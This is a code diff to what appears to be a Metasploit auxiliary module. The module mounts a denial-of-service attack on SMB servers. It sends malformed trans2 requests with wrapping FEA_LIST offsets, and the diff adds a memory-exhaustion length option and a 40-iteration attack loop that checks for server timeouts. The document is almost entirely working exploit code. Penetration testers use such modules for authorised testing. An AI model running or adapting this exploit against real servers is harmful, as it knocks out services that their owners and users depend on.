@@ -27,8 +27,8 @@ class Metasploit3 < Msf::Auxiliary
 		[ 'uint8', 'Flags', 0x00 ],
 		[ 'uint8', 'NameLen', 0x07 ], # length of Name parameter minus trailing newline
 		[ 'uint16v', 'ValueLen', 0x04 ], #random valuelen with value
-		[ 'string', 'Name', 7, "dzlnly\x00" ], # Random string must end with '\0'
-		[ 'string', 'Value', 4, "\x00\x00\x00\x00" ]
+		[ 'string', 'Name', 7, Rex::Text.rand_text_alpha(6) + "\x00" ], # Random string must end with '\0'
+		[ 'string', 'Value', nil, "\x00\x00\x00\x00" ]
 	)
 
 	def initialize(info = {})
@@ -55,25 +55,25 @@ class Metasploit3 < Msf::Auxiliary
 				Opt::RHOST(),
 				Opt::RPORT(445),
 				OptString.new('SMBShare', [true, 'Target share', '']),
+				OptString.new('MsgLen', [true, 'How soon a memory get exhausted depends on the length of that attribute', '1500']),
 			], self.class)
 
 	end
 
 	def get_fid
-		print_status("Try to find any files or directories for setting our attributes...")
-		files = self.simple.client.find_first("*")
-		path = ""
-		ok = self.simple.client.create(path)
+		ok = self.simple.client.create("/")
 		return ok['Payload'].v['FileID']
 	end
 	def mk_items_payload
 		item1 = FEA_LIST.make_struct
+		item2 = FEA_LIST.make_struct
+		item3 = FEA_LIST.make_struct #Some padding
+		item2.v['ValueLen'] = item1.v['ValueLen'] = datastore['MsgLen'].to_i
+		item2.v['Value'] = item1.v['Value'] = "\x00" * datastore['MsgLen'].to_i
 		ilen = item1.to_s.length
 		item1.v['NextOffset'] = ilen
-		item2 = FEA_LIST.make_struct
 		# Wrap offset to 0x00
 		item2.v['NextOffset'] = 0xffffffff - ilen + 1
-		item3 = FEA_LIST.make_struct #Some padding
 		return item1.to_s + item2.to_s + item3.to_s
 	end
 	def send_pkt
@@ -86,14 +86,21 @@ class Metasploit3 < Msf::Auxiliary
 		self.simple.client.trans2(subcmd, trans.to_s, data.to_s, false)
 	end
 	def run
-		connect()
-		smb_login()
-		self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")
+		40.times do
+			connect()
+			smb_login()
+			self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")
 
-		print_status('Sending malicious package...')
-		send_pkt
-		print_status('Seems like all ok')
+			print_status('Sending malicious package...')
+			send_pkt
 
-		disconnect()
+			begin
+				self.simple.client.create("")
+				print_status('Server Responce, DOS unsuccessfull')
+			rescue Timeout::Error
+				print_good('Server timed out, this is expected')
+			end
+			disconnect()
+		end
 	end
 end
